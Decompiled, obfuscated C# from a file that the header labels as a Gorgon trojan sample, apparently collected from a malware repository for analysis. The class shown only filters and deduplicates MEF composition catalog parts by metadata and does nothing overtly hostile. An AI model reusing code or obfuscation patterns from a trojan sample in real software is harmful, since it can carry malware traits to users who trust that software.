// Decompiled with JetBrains decompiler
// Type: 2TZs6tE.MLRjbIR
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using \u0030aaYmlN;
using \u0032TZs6tE;
using \u0037rV4tMC;
using System;
using System.Collections.Generic;
using System.ComponentModel.Composition.Hosting;
using System.ComponentModel.Composition.Primitives;
using System.Linq;
using vn312U5;

namespace \u0032TZs6tE
{
  internal static class MLRjbIR
  {
    public static IEnumerable<string> GYRyjQi(ImportDefinition _param0)
    {
      T5QzN9o.\u0033tTPFFS obj = new T5QzN9o.\u0033tTPFFS(-2);
      // ISSUE: reference to a compiler-generated field
      ((MLRjbIR.FJOSSy6) obj).nQu89BX = _param0;
      return (IEnumerable<string>) obj;
    }

    public static IEnumerable<string> DHeZKzU(ComposablePartDefinition j8KlTwD) => j8KlTwD.ExportDefinitions.Select<ExportDefinition, string>((Func<ExportDefinition, string>) (Zky87jc => Zky87jc.ContractName));

    public static IEnumerable<int> lC5UII5(IEnumerable<ComposablePartDefinition> _param0) => _param0.SelectMany<ComposablePartDefinition, string>((Func<ComposablePartDefinition, IEnumerable<string>>) (j4oOeky => MLRjbIR.DHeZKzU(j4oOeky))).Select<string, int>((Func<string, int>) (Zn5ScPA => Zn5ScPA.GetHashCode()));

    public static ComposablePartCatalog MVAHeFh(
      ComposablePartCatalog xENcw0e,
      string B6fFStr)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      MLRjbIR.odGgexD odGgexD = (MLRjbIR.odGgexD) new MLRjbIR.oPBbUXH();
      Dictionary<string, ComposablePartDefinition> dictionary = new Dictionary<string, ComposablePartDefinition>();
      // ISSUE: reference to a compiler-generated field
      ((MLRjbIR.oPBbUXH) odGgexD).jvwPw3O = cvsquDh.NiJAdLb<ComposablePartDefinition>();
      foreach (ComposablePartDefinition composablePartDefinition in xENcw0e)
      {
        string str = composablePartDefinition.Q2TurJN();
        if (!string.IsNullOrEmpty(str) && str != B6fFStr)
        {
          // ISSUE: reference to a compiler-generated field
          ((MLRjbIR.oPBbUXH) odGgexD).jvwPw3O.Add(composablePartDefinition);
        }
        else
        {
          string key = composablePartDefinition.Metadata.CjJwvq6<string>("System.ComponentModel.Composition.Caching.PartIdentity");
          if (!string.IsNullOrEmpty(key))
          {
            ComposablePartDefinition AmupegC;
            bool flag = dictionary.TryGetValue(key, out AmupegC);
            if (!flag || composablePartDefinition.dF1rNmw(AmupegC, B6fFStr))
            {
              dictionary[key] = composablePartDefinition;
              if (flag)
              {
                // ISSUE: reference to a compiler-generated field
                ((MLRjbIR.oPBbUXH) odGgexD).jvwPw3O.Add(AmupegC);
              }
            }
            else
            {
              // ISSUE: reference to a compiler-generated field
              ((MLRjbIR.oPBbUXH) odGgexD).jvwPw3O.Add(composablePartDefinition);
            }
          }
        }
      }
      // ISSUE: reference to a compiler-generated method
      return (ComposablePartCatalog) xENcw0e.Filter(new Func<ComposablePartDefinition, bool>(odGgexD.xqJ02cF));
    }

    private static bool dF1rNmw(
      this ComposablePartDefinition eZRtlX3,
      ComposablePartDefinition AmupegC,
      string vz8gXO3)
    {
      if (!string.IsNullOrEmpty(vz8gXO3))
      {
        if (eZRtlX3.Q2TurJN() == vz8gXO3 && AmupegC.Q2TurJN() != vz8gXO3)
          return true;
        if (AmupegC.Q2TurJN() == vz8gXO3 && eZRtlX3.Q2TurJN() != vz8gXO3)
          return false;
      }
      return eZRtlX3.Zqhc5ez() > AmupegC.Zqhc5ez();
    }

    private static Version Zqhc5ez(this ComposablePartDefinition cakORae)
    {
      Version result;
      if (!Version.TryParse(cakORae.Metadata.CjJwvq6<string>("System.ComponentModel.Composition.Caching.PartVersion"), out result))
        result = new Version();
      return result;
    }

    private static string Q2TurJN(this ComposablePartDefinition kyZrJ4y) => kyZrJ4y.Metadata.CjJwvq6<string>("System.ComponentModel.Composition.Caching.PartTargetHost");
  }
}
